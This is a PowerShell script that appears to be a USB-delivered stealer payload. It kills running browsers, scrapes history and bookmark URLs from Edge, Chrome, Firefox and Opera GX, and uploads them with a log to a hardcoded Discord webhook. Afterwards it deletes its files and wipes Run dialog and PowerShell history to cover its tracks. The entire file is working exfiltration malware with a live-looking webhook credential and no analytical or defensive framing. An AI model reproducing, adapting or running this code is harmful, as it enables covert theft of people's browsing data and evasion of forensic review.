# --- Configuration ---
$hookurl = "https://discord.com/api/webhooks/1370438670624100382/U6QnOyMsmo8g8xbKALx-TLTdT5SMQ0F0UnPQOnKjQLFu42KRdEKw3UfaI79LaUAGdXin"
$logFile = "$env:TMP\--BrowserData.log"
$dataFile = "$env:TMP\--BrowserData.csv"

# --- Helper Functions ---

function Write-Log {
    param([string]$Message)
    "$(Get-Date -Format u) - $Message" | Out-File -FilePath $logFile -Append
}

function Send-DiscordMessage {
    param([string]$Content)
    $username = "Status from $($env:COMPUTERNAME)"
    $Body = @{ username = $username; content = $Content } | ConvertTo-Json -Compress
    try {
        Invoke-RestMethod -Uri $hookurl -Method Post -Body $Body -ContentType 'Application/Json' -ErrorAction Stop
    } catch {
        Write-Log "CRITICAL: Failed to send Discord message. Error: $($_.Exception.Message)"
    }
}

function Upload-DiscordFile {
    param([string]$FilePath, [string]$Comment)
    if (-not (Test-Path $FilePath)) {
        Write-Log "Upload skipped: File path '$FilePath' does not exist."
        return
    }
    Write-Log "Attempting to upload $FilePath using PowerShell 5.1 compatible method..."
    $boundary = "---------------------------$([System.Guid]::NewGuid().ToString())"
    $contentType = "multipart/form-data; boundary=$boundary"
    $username = "File from $($env:COMPUTERNAME)"
    $jsonPayload = @{ username = $username; content = $Comment } | ConvertTo-Json -Compress
    try {
        $fileBytes = [System.IO.File]::ReadAllBytes($FilePath)
        $fileEnc = [System.Text.Encoding]::Default.GetString($fileBytes)
        $fileName = (Get-Item $FilePath).Name
        $bodyLines = @()
        $bodyLines += "--$boundary"; $bodyLines += "Content-Disposition: form-data; name=`"payload_json`""; $bodyLines += ""; $bodyLines += $jsonPayload
        $bodyLines += "--$boundary"; $bodyLines += "Content-Disposition: form-data; name=`"file1`"; filename=`"$fileName`""; $bodyLines += "Content-Type: application/octet-stream"; $bodyLines += ""; $bodyLines += $fileEnc
        $bodyLines += "--$boundary--"
        $body = ($bodyLines -join "`r`n")
        Invoke-RestMethod -Uri $hookurl -Method Post -ContentType $contentType -Body $body -ErrorAction Stop
        Write-Log "Upload successful for $FilePath."
    } catch {
        $errorMessage = "UPLOAD FAILED for $FilePath. Error: $($_.Exception.Message | Out-String)"
        Write-Log $errorMessage
        Send-DiscordMessage -Content $errorMessage
    }
}

function Stop-BrowserProcesses {
    Write-Log "Stopping browser processes..."
    $browserProcesses = @("msedge", "chrome", "firefox", "opera")
    foreach ($process in $browserProcesses) {
        Get-Process $process -ErrorAction SilentlyContinue | Stop-Process -Force -ErrorAction SilentlyContinue
    }
    Write-Log "Browser processes stop commands issued."
    Start-Sleep -Seconds 2
}

function Get-BrowserData {
    param([string]$Browser, [string]$DataType)
    $Regex = '(http|https)://([\w-]+\.)+[\w-]+(/[\w- ./?%&=]*)*?'
    $Paths = @{
        chrome_history   = "$Env:USERPROFILE\AppData\Local\Google\Chrome\User Data\Default\History";
        chrome_bookmarks = "$Env:USERPROFILE\AppData\Local\Google\Chrome\User Data\Default\Bookmarks";
        edge_history     = "$Env:USERPROFILE\AppData\Local\Microsoft\Edge\User Data\Default\History";
        edge_bookmarks   = "$Env:USERPROFILE\AppData\Local\Microsoft\Edge\User Data\Default\Bookmarks";
        firefox_history  = "$Env:USERPROFILE\AppData\Roaming\Mozilla\Firefox\Profiles\*.default-release\places.sqlite";
        opera_history    = "$Env:USERPROFILE\AppData\Roaming\Opera Software\Opera GX Stable\History";
        opera_bookmarks  = "$Env:USERPROFILE\AppData\Roaming\Opera Software\Opera GX Stable\Bookmarks";
    }
    $key = "${Browser}_${DataType}"
    $potentialPath = $Paths[$key]
    if (!$potentialPath) { return }
    $resolvedPath = Resolve-Path $potentialPath -ErrorAction SilentlyContinue
    if (!$resolvedPath) {
        Write-Log "Data source not found for $Browser - $DataType"
        return
    }
    Write-Log "Extracting from $resolvedPath"
    try {
        Get-Content -Path $resolvedPath -Raw -Encoding Default -ErrorAction SilentlyContinue | Select-String -AllMatches $regex | ForEach-Object { $_.Matches.Value } | Sort-Object -Unique | ForEach-Object {
            "$($env:UserName),$Browser,$DataType,$_" | Add-Content -Path $dataFile
        }
    } catch {
        Write-Log "Error reading file $resolvedPath. Error: $($_.Exception.Message)"
    }
}

# --- Main Execution with Robust Error Handling ---

Remove-Item $logFile, $dataFile -ErrorAction SilentlyContinue
Write-Log "Script execution started."

try {
    Send-DiscordMessage -Content "Payload running on $($env:COMPUTERNAME)..."
    Stop-BrowserProcesses
    Write-Log "Gathering data..."
    "User,Browser,DataType,URL" | Out-File -FilePath $dataFile -Encoding utf8
    Get-BrowserData -Browser "edge" -DataType "history"; Get-BrowserData -Browser "edge" -DataType "bookmarks"
    Get-BrowserData -Browser "chrome" -DataType "history"; Get-BrowserData -Browser "chrome" -DataType "bookmarks"
    Get-BrowserData -Browser "firefox" -DataType "history"
    Get-BrowserData -Browser "opera" -DataType "history"; Get-BrowserData -Browser "opera" -DataType "bookmarks"
    Write-Log "Data gathering complete."
    if ((Test-Path $dataFile) -and (Get-Item $dataFile).Length -gt 100) {
        Upload-DiscordFile -FilePath $dataFile -Comment "Browser data attached."
    } else {
        Write-Log "No significant browser data was collected."
        Send-DiscordMessage -Content "No browser data found to upload."
    }
} catch {
    Write-Log "A critical, unexpected error occurred in the main script block: $($_.Exception.Message | Out-String)"
} finally {
    Write-Log "Execution finished. Starting cleanup."
    Upload-DiscordFile -FilePath $logFile -Comment "Execution log attached."
    Start-Sleep -Seconds 5
    Remove-Item $logFile, $dataFile -ErrorAction SilentlyContinue
    try {
        Write-Log "Clearing Run history..."
        $runMruPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU"
        if (Test-Path $runMruPath) {
            Get-ItemProperty -Path $runMruPath | Get-Member -MemberType NoteProperty | Where-Object { $_.Name -ne "MRUList" } | ForEach-Object { Remove-ItemProperty -Path $runMruPath -Name $_.Name -Force -ErrorAction SilentlyContinue }
            Set-ItemProperty -Path $runMruPath -Name "MRUList" -Value ([char[]]@()) -Force -ErrorAction SilentlyContinue
        }
        Write-Log "Clearing PowerShell history file..."
        $psHistoryPath = (Get-PSReadlineOption).HistorySavePath
        if (Test-Path $psHistoryPath) { Clear-Content -Path $psHistoryPath -ErrorAction SilentlyContinue }
        Write-Log "Clearing current PowerShell session history..."
        Clear-History
    } catch {
        Write-Log "A non-critical error occurred during cleanup: $($_.Exception.Message | Out-String)"
    }
    Write-Log "Cleanup complete."
}
